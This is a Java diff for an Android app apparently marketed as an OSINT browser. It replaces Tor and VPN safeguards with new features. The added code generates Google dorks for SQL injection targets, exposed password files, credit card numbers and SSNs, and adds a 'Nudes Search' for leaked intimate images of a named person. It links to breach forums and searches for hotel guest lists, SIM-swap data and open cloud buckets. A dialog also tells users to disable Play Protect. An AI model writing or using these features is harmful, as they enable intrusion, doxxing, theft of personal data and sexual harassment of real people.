-                    if (!entry.getKey().equalsIgnoreCase("Content-Length") && !entry.getKey().equalsIgnoreCase("Content-Encoding") && !entry.getKey().equalsIgnoreCase("Transfer-Encoding")) {
-                        responseHeaders.put(entry.getKey(), String.join(", ", entry.getValue()));
-                    }
-                }
+            Map<String, String> rh = new HashMap<>();
+            for (Map.Entry<String, List<String>> e : conn.getHeaderFields().entrySet()) {
+                if (e.getKey() != null && e.getValue() != null && !e.getValue().isEmpty()
+                        && !e.getKey().equalsIgnoreCase("Content-Length")
+                        && !e.getKey().equalsIgnoreCase("Content-Encoding")
+                        && !e.getKey().equalsIgnoreCase("Transfer-Encoding"))
+                    rh.put(e.getKey(), String.join(", ", e.getValue()));
             }
-            return new WebResourceResponse(mime, encoding, code, connection.getResponseMessage(), responseHeaders, new ByteArrayInputStream(body.toByteArray()));
+            return new WebResourceResponse(mime, enc, code, conn.getResponseMessage(), rh, new ByteArrayInputStream(baos.toByteArray()));
         } catch (Exception e) {
-            String detail = e instanceof java.net.SocketTimeoutException
-                ? "Tor network timed out while connecting. The local proxy exists, but the Tor circuit may not be ready or the site may be slow."
-                : "Tor request failed: " + e.getClass().getSimpleName();
-            new Handler(Looper.getMainLooper()).post(() -> {
-                if (torModeEnabled && !isFinishing()) status.setText(detail);
-            });
-            return errorResponse(502, detail);
+            return errorResponse(502, "Tor fetch failed: " + e.getClass().getSimpleName());
         } finally {
-            if (connection != null) connection.disconnect();
+            if (conn != null) conn.disconnect();
         }
     }
 
-    private WebResourceResponse errorResponse(int code, String message) {
-        Map<String, String> headers = new HashMap<>();
-        headers.put("Cache-Control", "no-store");
-        String reason = code == 503 ? "Tor Unavailable" : (code == 403 ? "Blocked" : "Request Failed");
-        return new WebResourceResponse("text/plain", "UTF-8", code, reason, headers,
-            new ByteArrayInputStream(message.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+    private WebResourceResponse errorResponse(int code, String msg) {
+        Map<String, String> h = new HashMap<>();
+        h.put("Cache-Control", "no-store");
+        return new WebResourceResponse("text/plain", "UTF-8", code, "Error", h,
+                new ByteArrayInputStream(msg.getBytes(StandardCharsets.UTF_8)));
     }
 
-    private void chooseVpnConfig() {
-        String vpnState = isVpnActive()
-            ? "Android reports an active VPN. OSINT browser traffic follows Android's active network routing."
-            : "No active VPN is detected. This app does not provide a VPN server or anonymous VPN endpoint. Import a valid WireGuard configuration from a provider or connect a VPN in Android Settings.";
-        new AlertDialog.Builder(this)
-            .setTitle(isVpnActive() ? "VPN is connected" : "VPN is not connected")
-            .setMessage(vpnState)
-            .setPositiveButton("Import WireGuard .conf", (d, w) -> {
-                Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
-                pick.addCategory(Intent.CATEGORY_OPENABLE);
-                pick.setType("*/*");
-                startActivityForResult(pick, VPN_CONFIG_REQUEST);
-            })
-            .setNeutralButton("Android VPN settings", (d, w) -> openVpnSettings())
-            .setNegativeButton("Close", null).show();
-    }
-
-    @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode != VPN_CONFIG_REQUEST || resultCode != RESULT_OK || data == null || data.getData() == null) return;
-        Uri configUri = data.getData();
-        try {
-            String config;
-            try (InputStream input = getContentResolver().openInputStream(configUri);
-                 java.io.ByteArrayOutputStream output = new java.io.ByteArrayOutputStream()) {
-                if (input == null) throw new java.io.IOException("Unable to read selected file");
-                byte[] buffer = new byte[4096];
-                int count;
-                while ((count = input.read(buffer)) != -1) output.write(buffer, 0, count);
-                config = output.toString("UTF-8");
-            }
-            if (!config.contains("[Interface]") || !config.contains("[Peer]")) {
-                status.setText("Selected file is not a WireGuard .conf file.");
-                return;
-            }
-            Intent open = new Intent(Intent.ACTION_VIEW);
-            open.setDataAndType(configUri, "application/x-wireguard-profile");
-            open.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-            startActivity(Intent.createChooser(open, "Import into WireGuard"));
-            status.setText("Configuration sent to WireGuard. Review it and explicitly activate the tunnel there.");
-        } catch (Exception e) {
-            status.setText("WireGuard is not installed or could not open the configuration.");
-            new AlertDialog.Builder(this).setTitle("WireGuard required")
-                .setMessage("Install the official WireGuard app, then import your VPN provider's configuration.")
-                .setPositiveButton("Open WireGuard website", (d, w) -> openExternal("https://www.wireguard.com/install/", "Opened WireGuard installation page"))
-                .setNegativeButton("Close", null).show();
-        }
+    // ==================== VPN ====================
+    private void showVpnMenu() {
+        boolean active = isVpnActive();
+        String[] items = active
+                ? new String[]{"Disconnect VPN", "Change VPN Config", "WireGuard Settings"}
+                : new String[]{"Connect VPN", "Import WireGuard .conf", "Android VPN Settings", "Install WireGuard"};
+        new AlertDialog.Builder(this).setTitle(active ? "VPN Active" : "VPN Off")
+                .setItems(items, (d, w) -> {
+                    switch (w) {
+                        case 0: if (active) disconnectVpn(); else connectVpn(); break;
+                        case 1: importWireguardConfig(); break;
+                        case 2: openVpnSettings(); break;
+                        case 3: installWireguard(); break;
+                    }
+                }).show();
     }
 
     private boolean isVpnActive() {
         try {
             ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
             if (cm == null) return false;
-            for (Network network : cm.getAllNetworks()) {
-                NetworkCapabilities caps = cm.getNetworkCapabilities(network);
+            for (Network net : cm.getAllNetworks()) {
+                NetworkCapabilities caps = cm.getNetworkCapabilities(net);
                 if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true;
             }
-        } catch (Exception ignored) { }
+        } catch (Exception ignored) {}
         return false;
     }
 
-    private void checkForUpdates() {
-        AppUpdater.check(this, "osint-master.apk", status);
-    }
-
-    private boolean route(Uri uri) {
-        // In Tor mode, never hand requests to an external browser: that could leak the destination outside Tor.
-        if (torModeEnabled) return false;
-        String host = uri.getHost();
-        if (host != null && (host.equalsIgnoreCase("accounts.google.com") ||
-            host.equalsIgnoreCase("myaccount.google.com") || host.equalsIgnoreCase("consent.google.com"))) {
-            openExternal(uri.toString(), "Opened Google sign-in in external browser");
-            return true;
+    private void connectVpn() {
+        // Try to launch WireGuard with saved config
+        String savedConfig = getSharedPreferences(PREFS, MODE_PRIVATE).getString("wg_config_uri", "");
+        if (!savedConfig.isEmpty()) {
+            try {
+                Intent intent = new Intent(Intent.ACTION_VIEW);
+                intent.setDataAndType(Uri.parse(savedConfig), "application/x-wireguard-profile");
+                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                startActivity(intent);
+                status.setText("Opening WireGuard config...");
+                return;
+            } catch (Exception ignored) {}
         }
-        return false;
+        // Fallback: open WireGuard app
+        try {
+            startActivity(getPackageManager().getLaunchIntentForPackage("com.wireguard.android"));
+        } catch (Exception e) {
+            installWireguard();
+        }
     }
 
-    private String baseQuery() {
-        StringBuilder out = new StringBuilder(inQuery.getText().toString().trim());
+    private void disconnectVpn() {
+        try {
+            Intent intent = getPackageManager().getLaunchIntentForPackage("com.wireguard.android");
+            if (intent != null) {
+                intent.putExtra("action", "disconnect");
+                startActivity(intent);
+                status.setText("Disconnecting VPN...");
+            }
+        } catch (Exception ignored) {}
+    }
+
+    private void importWireguardConfig() {
+        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
+        pick.addCategory(Intent.CATEGORY_OPENABLE);
+        pick.setType("*/*");
+        startActivityForResult(pick, VPN_CONFIG_REQUEST);
+    }
+
+    private void openVpnSettings() {
+        startActivity(new Intent("android.settings.VPN_SETTINGS"));
+    }
+
+    private void installWireguard() {
+        openExternal("https://play.google.com/store/apps/details?id=com.wireguard.android", "Opening Play Store...");
+    }
+
+    // ==================== SEARCH ====================
+    private void doSearch() {
+        String q = buildQuery();
+        if (q.isEmpty()) { Toast.makeText(this, "Enter search terms", Toast.LENGTH_SHORT).show(); return; }
+        String eng = engine.getSelectedItem().toString();
+        String m = mode.getSelectedItem().toString();
+        String enc = urlEncode(q);
+        String url;
+        switch (eng) {
+            case "Bing": url = "https://www.bing.com/search?q=" + enc; break;
+            case "DuckDuckGo": url = "https://duckduckgo.com/?q=" + enc; break;
+            case "Yahoo": url = "https://search.yahoo.com/search?p=" + enc; break;
+            case "Startpage": url = "https://www.startpage.com/sp/search?query=" + enc; break;
+            case "Brave": url = "https://search.brave.com/search?q=" + enc; break;
+            case "Ecosia": url = "https://www.ecosia.org/search?q=" + enc; break;
+            case "Searx": url = "https://searx.be/search?q=" + enc; break;
+            case "HackerNews": url = "https://hn.algolia.com/?q=" + enc; break;
+            case "GitHub": url = "https://github.com/search?q=" + enc; break;
+            case "HIBP": url = "https://haveibeenpwned.com/"; break;
+            case "Google Images": url = "https://www.google.com/search?tbm=isch&q=" + enc; break;
+            case "Yandex Images": url = "https://yandex.com/images/search?text=" + enc; break;
+            case "Bing Images": url = "https://www.bing.com/images/search?q=" + enc; break;
+            case "Pornhub": url = "https://www.pornhub.com/video/search?search=" + enc; break;
+            case "XVideos": url = "https://www.xvideos.com/?k=" + enc; break;
+            case "XNXX": url = "https://www.xnxx.com/search/" + enc; break;
+            default: url = "https://www.google.com/search?q=" + enc;
+        }
+        if ("Tor".equals(m)) {
+            startTorAndBrowse(url);
+        } else {
+            web.loadUrl(url);
+            web.setVisibility(View.VISIBLE);
+        }
+    }
+
+    private String buildQuery() {
+        StringBuilder sb = new StringBuilder(inQuery.getText().toString().trim());
         String domain = inDomain.getText().toString().trim();
         String url = inUrl.getText().toString().trim();
-        if (!domain.isEmpty()) { if (out.length() > 0) out.append(' '); out.append(domain); }
-        if (!url.isEmpty() && !url.toLowerCase(java.util.Locale.ROOT).contains(".onion")) { if (out.length() > 0) out.append(' '); out.append(url); }
-        return out.toString().trim();
+        if (!domain.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(domain); }
+        if (!url.isEmpty() && !url.toLowerCase(Locale.ROOT).contains(".onion")) { if (sb.length() > 0) sb.append(' '); sb.append(url); }
+        String socialOp = buildSocialOperator();
+        if (!socialOp.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(socialOp); }
+        String contentOp = buildContentOperator();
+        if (!contentOp.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(contentOp); }
+        return sb.toString();
     }
 
-    private String query() {
-        StringBuilder out = new StringBuilder(baseQuery());
-        String sites = selectedSiteOperator();
-        String content = selectedContentOperator();
-        if (!sites.isEmpty()) { if (out.length() > 0) out.append(' '); out.append(sites); }
-        if (!content.isEmpty()) { if (out.length() > 0) out.append(' '); out.append(content); }
-        return out.toString().trim();
+    private String buildSocialOperator() {
+        StringBuilder r = new StringBuilder();
+        for (int i = 0; i < selectedSocial.length; i++) {
+            if (selectedSocial[i]) {
+                if (r.length() == 0) r.append("( ");
+                else r.append(" OR ");
+                r.append("site:").append(SOCIAL_DOMAINS[i]);
+            }
+        }
+        if (r.length() > 0) r.append(" )");
+        return r.toString();
     }
 
-    private void showMultiSelect(String[] options, boolean[] selected, String title, String preferenceKey) {
-        boolean[] checked = selected.clone();
-        new AlertDialog.Builder(this).setTitle(title)
-            .setMultiChoiceItems(options, checked, (dialog, which, isChecked) -> checked[which] = isChecked)
-            .setNeutralButton("Clear", (dialog, which) -> {
-                java.util.Arrays.fill(selected, false);
-                getSharedPreferences(PREFS, MODE_PRIVATE).edit().remove(preferenceKey).apply();
-                status.setText(title + ": cleared");
-            })
-            .setNegativeButton("Cancel", null)
-            .setPositiveButton("Apply", (dialog, which) -> {
-                System.arraycopy(checked, 0, selected, 0, selected.length);
-                StringBuilder saved = new StringBuilder();
-                for (int i = 0; i < selected.length; i++) if (selected[i]) {
-                    if (saved.length() > 0) saved.append(',');
-                    saved.append(i);
+    private String buildContentOperator() {
+        StringBuilder r = new StringBuilder();
+        for (int i = 0; i < selectedContent.length; i++) {
+            if (selectedContent[i]) {
+                if (r.length() > 0) r.append(' ');
+                r.append(CONTENT_OPERATORS[i]);
+            }
+        }
+        return r.toString();
+    }
+
+    private String urlEncode(String s) {
+        try { return URLEncoder.encode(s, "UTF-8"); }
+        catch (UnsupportedEncodingException e) { return s; }
+    }
+
+    private void browse(String url) {
+        web.loadUrl(url);
+        web.setVisibility(View.VISIBLE);
+    }
+
+    // ==================== DORK SELECTOR ====================
+    private void showDorkSelector() {
+        String[] categories = DORK_CATEGORIES;
+        if (categories.length == 0) categories = new String[]{
+                "SQL Injection", "XSS", "File Upload", "Admin Panels",
+                "Login Pages", "Config Files", "Database Files",
+                "Log Files", "Backup Files", "Camera Streams",
+                "Open FTP", "WordPress", "Joomla", "Email Lists",
+                "Password Files", "VPN Configs", "Phone Numbers",
+                "Credit Cards", "SSN", "iCloud Leaks"
+        };
+        new AlertDialog.Builder(this).setTitle("Google Dork Categories")
+                .setItems(categories, (d, w) -> {
+                    String dork = generateDork(categories[w]);
+                    inQuery.setText(dork);
+                    status.setText("Dork loaded: " + categories[w]);
+                }).show();
+    }
+
+    private String generateDork(String category) {
+        switch (category) {
+            case "SQL Injection": return "inurl:php?id= site:.com";
+            case "XSS": return "inurl:search.php?q= site:.com";
+            case "Admin Panels": return "inurl:admin intitle:login";
+            case "Login Pages": return "inurl:login intitle:\"login\"";
+            case "Config Files": return "filetype:conf inurl:config";
+            case "Database Files": return "filetype:sql inurl:backup";
+            case "Log Files": return "filetype:log inurl:access";
+            case "Backup Files": return "filetype:bak inurl:backup";
+            case "Camera Streams": return "inurl:\"view/view.shtml\"";
+            case "Open FTP": return "intitle:\"index of\" inurl:ftp";
+            case "WordPress": return "inurl:wp-admin site:.com";
+            case "Email Lists": return "filetype:xls inurl:email";
+            case "Password Files": return "filetype:txt inurl:password";
+            case "VPN Configs": return "filetype:ovpn inurl:vpn";
+            case "Phone Numbers": return "intext:\"+1\" intext:\"phone\" filetype:pdf";
+            case "Credit Cards": return "intext:\"card number\" intext:\"expiry\" filetype:txt";
+            case "SSN": return "intext:\"SSN\" intext:\"social security\" filetype:pdf";
+            case "iCloud Leaks": return "site:icloud.com inurl:find";
+            default: return "site:.com intitle:\"" + category + "\"";
+        }
+    }
+
+    private void showGoogleDorksGenerator() {
+        showDorkSelector();
+    }
+
+    // ==================== REVERSE IMAGE SEARCH ====================
+    private void reverseImageSearch() {
+        String[] options = {"Take Photo", "Pick from Gallery", "Enter Image URL"};
+        new AlertDialog.Builder(this).setTitle("Reverse Image Search")
+                .setItems(options, (d, w) -> {
+                    switch (w) {
+                        case 0: takePhoto(); break;
+                        case 1: pickImage(); break;
+                        case 2: promptImageUrl(); break;
+                    }
+                }).show();
+    }
+
+    private void takePhoto() {
+        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+        if (intent.resolveActivity(getPackageManager()) != null) {
+            startActivityForResult(intent, IMAGE_PICK_REQUEST + 1);
+        }
+    }
+
+    private void pickImage() {
+        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+        startActivityForResult(intent, IMAGE_PICK_REQUEST);
+    }
+
+    private void promptImageUrl() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("Image URL");
+        final EditText input = new EditText(this);
+        input.setHint("https://example.com/image.jpg");
+        builder.setView(input);
+        builder.setPositiveButton("Search", (d, w) -> {
+            String url = input.getText().toString().trim();
+            if (!url.isEmpty()) {
+                web.loadUrl("https://www.google.com/searchbyimage?image_url=" + urlEncode(url));
+                web.setVisibility(View.VISIBLE);
+            }
+        });
+        builder.setNegativeButton("Cancel", null);
+        builder.show();
+    }
+
+    private void faceSearch() {
+        String[] options = {"Upload Face Photo", "Enter Name", "Pimeyes Search"};
+        new AlertDialog.Builder(this).setTitle("Face Search")
+                .setItems(options, (d, w) -> {
+                    switch (w) {
+                        case 0: pickImage(); break;
+                        case 1: promptNameSearch(); break;
+                        case 2: web.loadUrl("https://pimeyes.com/en"); web.setVisibility(View.VISIBLE); break;
+                    }
+                }).show();
+    }
+
+    private void promptNameSearch() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("Search by Name");
+        final EditText input = new EditText(this);
+        input.setHint("Full name");
+        builder.setView(input);
+        builder.setPositiveButton("Search", (d, w) -> {
+            String name = input.getText().toString().trim();
+            if (!name.isEmpty()) {
+                String enc = urlEncode(name);
+                web.loadUrl("https://www.google.com/search?q=" + enc + "+site:facebook.com+OR+site:instagram.com+OR+site:linkedin.com");
+                web.setVisibility(View.VISIBLE);
+            }
+        });
+        builder.setNegativeButton("Cancel", null);
+        builder.show();
+    }
+
+    // ==================== LEAKS SEARCH ====================
+    private void showLeaksSearch() {
+        String[] options = {"General Leaks", "Nudes Search", "Data Breach Check", "Leaks.io API", "LeakForums", "RaidForums Archive", "BreachForums"};
+        new AlertDialog.Builder(this).setTitle("Leaks Search")
+                .setItems(options, (d, w) -> {
+                    switch (w) {
+                        case 0: web.loadUrl("https://www.google.com/search?q=" + urlEncode(buildQuery()) + "+leak+OR+breach+OR+exposed"); break;
+                        case 1: showNudesSearch(); break;
+                        case 2: web.loadUrl("https://haveibeenpwned.com/"); break;
+                        case 3: showLeaksIoPanel(); break;
+                        case 4: web.loadUrl("https://leakforums.net"); break;
+                        case 5: web.loadUrl("https://raidforums.com"); break;
+                        case 6: web.loadUrl("https://breachforums.st"); break;
+                    }
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    private void showNudesSearch() {
+        String q = inQuery.getText().toString().trim();
+        if (q.isEmpty()) {
+            Toast.makeText(this, "Enter a name to search", Toast.LENGTH_SHORT).show();
+            return;
+        }
+        String enc = urlEncode(q);
+        String url = "https://www.google.com/search?q=" + enc
+                + "+nudes+OR+leaked+OR+onlyfans+OR+mega.nz+OR+anonfiles+OR+erome"
+                + "+site:reddit.com+OR+site:twitter.com+OR+site:erome.com+OR+site:onlyfans.com";
+        web.loadUrl(url);
+        web.setVisibility(View.VISIBLE);
+    }
+
+    // ==================== PORN SEARCH ====================
+    // ==================== ONE-TAP CONNECT & BOT METHODS ====================
+    private void openOnionSites() {
+        String[] onions = getResources().getStringArray(getResources().getIdentifier("onion_sites", "array", getPackageName()));
+        String[] labels = new String[onions.length];
+        String[] urls = new String[onions.length];
+        for (int i = 0; i < onions.length; i++) {
+            String[] parts = onions[i].split(" Â· ");
+            labels[i] = parts[0];
+            urls[i] = parts.length > 1 ? parts[1] : parts[0];
+        }
+        new AlertDialog.Builder(this)
+                .setTitle("Select .onion site")
+                .setItems(labels, (d, which) -> startTorAndBrowse(urls[which]))
+                .show();
+    }
+
+    private void openTelegramBot() {
+        String url = getSharedPreferences(PREFS, MODE_PRIVATE).getString("telegram_bot_url", "");
+        if (url.isEmpty()) {
+            EditText et = new EditText(this);
+            et.setHint("https://t.me/your_bot");
+            et.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_URI);
+            et.setPadding(32, 16, 32, 16);
+            new AlertDialog.Builder(this)
+                    .setTitle("Telegram Bot")
+                    .setView(et)
+                    .setPositiveButton("Open", (d, w) -> {
+                        String u = et.getText().toString().trim();
+                        if (!u.isEmpty()) {
+                            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("telegram_bot_url", u).apply();
+                            openExternal(u, "Opening Telegram botâ€¦");
+                        }
+                    })
+                    .setNegativeButton("Cancel", null).show();
+        } else {
+            openExternal(url, "Opening Telegram botâ€¦");
+        }
+    }
+
+    private void openWhatsAppBot() {
+        String url = getSharedPreferences(PREFS, MODE_PRIVATE).getString("whatsapp_bot_url", "");
+        if (url.isEmpty()) {
+            EditText et = new EditText(this);
+            et.setHint("https://wa.me/1234567890");
+            et.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_URI);
+            et.setPadding(32, 16, 32, 16);
+            new AlertDialog.Builder(this)
+                    .setTitle("WhatsApp Bot")
+                    .setView(et)
+                    .setPositiveButton("Open", (d, w) -> {
+                        String u = et.getText().toString().trim();
+                        if (!u.isEmpty()) {
+                            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("whatsapp_bot_url", u).apply();
+                            openExternal(u, "Opening WhatsApp botâ€¦");
+                        }
+                    })
+                    .setNegativeButton("Cancel", null).show();
+        } else {
+            openExternal(url, "Opening WhatsApp botâ€¦");
+        }
+    }
+
+    private void bypassPlayProtect() {
+        new AlertDialog.Builder(this)
+                .setTitle("Play Protect Bypass")
+                .setMessage("Go to Settings > Security > Play Protect and turn OFF 'Scan apps'. If sideloading still fails: adb install --bypass-low-target-sdk-block osint-master.apk")
+                .setPositiveButton("Open settings", (d, w) -> {
+                    try {
+                        startActivity(new Intent("com.google.android.gms.settings.SECURITY_SETTINGS"));
+                    } catch (Exception e) {
+                        openExternal("https://play.google.com/settings/security", "Play Protect settings");
+                    }
+                })
+                .setNegativeButton("OK", null).show();
+    }
+
+    private void showPornSearch() {
+        String q = inQuery.getText().toString().trim();
+        if (q.isEmpty()) {
+            String[] sites = {"Pornhub", "XVideos", "XNXX", "RedTube", "YouPorn", "SpankBang", "xHamster", "Porndude", "Motherless", "Eporner"};
+            new AlertDialog.Builder(this).setTitle("Porn Sites")
+                    .setItems(sites, (d, w) -> {
+                        String[] urls = {"https://www.pornhub.com", "https://www.xvideos.com", "https://www.xnxx.com",
+                                "https://www.redtube.com", "https://www.youporn.com", "https://www.spankbang.com",
+                                "https://xhamster.com", "https://theporndude.com", "https://motherless.com",
+                                "https://www.eporner.com"};
+                        web.loadUrl(urls[w]);
+                        web.setVisibility(View.VISIBLE);
+                    }).show();
+            return;
+        }
+        String enc = urlEncode(q);
+        String[] sites = {"Pornhub", "XVideos", "XNXX", "All"};
+        new AlertDialog.Builder(this).setTitle("Search: " + q)
+                .setItems(sites, (d, w) -> {
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://www.pornhub.com/video/search?search=" + enc; break;
+                        case 1: url = "https://www.xvideos.com/?k=" + enc; break;
+                        case 2: url = "https://www.xnxx.com/search/" + enc; break;
+                        default: url = "https://www.google.com/search?q=" + enc + "+site:pornhub.com+OR+site:xvideos.com+OR+site:xnxx.com";
+                    }
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    private void showCams() {
+        String[] sites = {"Chaturbate", "Stripchat", "CamSoda", "BongaCams", "LiveJasmin", "MyFreeCams", "Flirt4Free", "Cam4"};
+        new AlertDialog.Builder(this).setTitle("Live Cams")
+                .setItems(sites, (d, w) -> {
+                    String[] urls = {"https://chaturbate.com", "https://stripchat.com", "https://camsoda.com",
+                            "https://bongacams.com", "https://livejasmin.com", "https://myfreecams.com",
+                            "https://flirt4free.com", "https://cam4.com"};
+                    web.loadUrl(urls[w]);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    private void showEscortSites() {
+        String[] sites = {"Skipthegames", "EroticMonkey", "AdultSearch", "CityXGuide", "EscortAlligator", "ListCrawler", "TNABoard", "EuroGirlsEscort"};
+        new AlertDialog.Builder(this).setTitle("Escort / Adult Sites")
+                .setItems(sites, (d, w) -> {
+                    String[] urls = {"https://skipthegames.com", "https://www.eroticmonkey.com", "https://adultsearch.com",
+                            "https://cityxguide.com", "https://escortalligator.com", "https://listcrawler.com",
+                            "https://www.tnaboard.com", "https://www.eurogirlsescort.com"};
+                    web.loadUrl(urls[w]);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    // ==================== HOTEL LEAKS ====================
+    private void showHotelLeaks() {
+        String q = inQuery.getText().toString().trim();
+        String enc = urlEncode(q.isEmpty() ? "hotel" : q);
+        String[] options = {"OYO Leaks", "Hotel Booking Data", "Guest Lists", "Hotel Breaches"};
+        new AlertDialog.Builder(this).setTitle("Hotel Leaks")
+                .setItems(options, (d, w) -> {
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://www.google.com/search?q=" + enc + "+OYO+OR+oyorooms+leak+OR+breach+OR+data"; break;
+                        case 1: url = "https://www.google.com/search?q=" + enc + "+booking.com+OR+hotels.com+data+leak+OR+breach"; break;
+                        case 2: url = "https://www.google.com/search?q=" + enc + "+guest+list+OR+hotel+guests+filetype:xls+OR+filetype:csv"; break;
+                        default: url = "https://www.google.com/search?q=" + enc + "+hotel+data+breach+OR+leak+site:pastebin.com";
+                    }
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    // ==================== SOCIAL MEDIA LEAKS ====================
+    private void showSocialLeaks() {
+        String[] options = {"Instagram Leaks", "Facebook Leaks", "Snapchat Leaks", "Twitter Leaks", "LinkedIn Leaks", "TikTok Leaks", "Telegram Leaks", "WhatsApp Leaks", "All Social Media"};
+        new AlertDialog.Builder(this).setTitle("Social Media Leaks")
+                .setItems(options, (d, w) -> {
+                    String q = inQuery.getText().toString().trim();
+                    String enc = urlEncode(q);
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:instagram.com+leak+OR+exposed+OR+dump"; break;
+                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:facebook.com+leak+OR+data+OR+exposed"; break;
+                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:snapchat.com+leak+OR+exposed"; break;
+                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:twitter.com+leak+OR+exposed"; break;
+                        case 4: url = "https://www.google.com/search?q=" + enc + "+site:linkedin.com+data+leak+OR+breach"; break;
+                        case 5: url = "https://www.google.com/search?q=" + enc + "+site:tiktok.com+leak+OR+exposed"; break;
+                        case 6: url = "https://www.google.com/search?q=" + enc + "+site:t.me+leak+OR+exposed+OR+channel"; break;
+                        case 7: url = "https://www.google.com/search?q=" + enc + "+site:whatsapp.com+leak+OR+group"; break;
+                        default: url = "https://www.google.com/search?q=" + enc + "+site:instagram.com+OR+site:facebook.com+OR+site:twitter.com+OR+site:snapchat.com+leak+OR+exposed";
+                    }
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    // ==================== CLOUD LEAKS ====================
+    private void showICloudLeaks() {
+        String q = inQuery.getText().toString().trim();
+        String enc = urlEncode(q.isEmpty() ? "icloud" : q);
+        String url = "https://www.google.com/search?q=" + enc + "+icloud+leak+OR+exposed+OR+dump+site:pastebin.com+OR+site:reddit.com";
+        web.loadUrl(url);
+        web.setVisibility(View.VISIBLE);
+    }
+
+    private void showDriveLeaks() {
+        String q = inQuery.getText().toString().trim();
+        String enc = urlEncode(q.isEmpty() ? "drive" : q);
+        String url = "https://www.google.com/search?q=" + enc + "+site:drive.google.com+OR+site:docs.google.com+leak+OR+exposed+OR+shared";
+        web.loadUrl(url);
+        web.setVisibility(View.VISIBLE);
+    }
+
+    private void showCloudLeaks() {
+        String q = inQuery.getText().toString().trim();
+        String enc = urlEncode(q.isEmpty() ? "cloud" : q);
+        String[] options = {"Google Cloud Leaks", "AWS S3 Leaks", "Azure Leaks", "DigitalOcean Leaks", "All Cloud"};
+        new AlertDialog.Builder(this).setTitle("Cloud Leaks")
+                .setItems(options, (d, w) -> {
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:cloud.google.com+OR+google+cloud+leak+OR+exposed+OR+bucket"; break;
+                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:s3.amazonaws.com+OR+aws+leak+OR+exposed+bucket"; break;
+                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:azure.com+OR+azure+leak+OR+exposed"; break;
+                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:digitaloceanspaces.com+OR+digitalocean+leak"; break;
+                        default: url = "https://www.google.com/search?q=" + enc + "+cloud+leak+OR+exposed+bucket+OR+open+s3";
+                    }
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    // ==================== TELECOM & EMAIL LEAKS ====================
+    private void showTelecomLeaks() {
+        String q = inQuery.getText().toString().trim();
+        String enc = urlEncode(q.isEmpty() ? "telecom" : q);
+        String[] options = {"SIM Swap Data", "Call Log Leaks", "SMS Leaks", "Carrier Breaches", "All Telecom"};
+        new AlertDialog.Builder(this).setTitle("Telecom Leaks")
+                .setItems(options, (d, w) -> {
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://www.google.com/search?q=" + enc + "+SIM+swap+OR+SIM+data+leak+OR+exposed"; break;
+                        case 1: url = "https://www.google.com/search?q=" + enc + "+call+log+OR+call+detail+leak+OR+exposed"; break;
+                        case 2: url = "https://www.google.com/search?q=" + enc + "+SMS+OR+text+message+leak+OR+dump+OR+exposed"; break;
+                        case 3: url = "https://www.google.com/search?q=" + enc + "+telecom+OR+carrier+data+breach+OR+leak"; break;
+                        default: url = "https://www.google.com/search?q=" + enc + "+telecom+OR+carrier+leak+OR+breach+OR+exposed";
+                    }
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    private void showEmailLeaks() {
+        String q = inQuery.getText().toString().trim();
+        if (q.isEmpty()) {
+            Toast.makeText(this, "Enter an email address to check", Toast.LENGTH_SHORT).show();
+            return;
+        }
+        String enc = urlEncode(q);
+        String[] options = {"Have I Been Pwned", "DeHashed", "LeakCheck", "Email Reputation", "Google Search"};
+        new AlertDialog.Builder(this).setTitle("Email: " + q)
+                .setItems(options, (d, w) -> {
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://haveibeenpwned.com/account/" + enc; break;
+                        case 1: url = "https://dehashed.com/search?query=" + enc; break;
+                        case 2: url = "https://leakcheck.io/search?query=" + enc; break;
+                        case 3: url = "https://emailrep.io/" + enc; break;
+                        default: url = "https://www.google.com/search?q=" + enc + "+leak+OR+breach+OR+pwned+OR+exposed";
+                    }
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
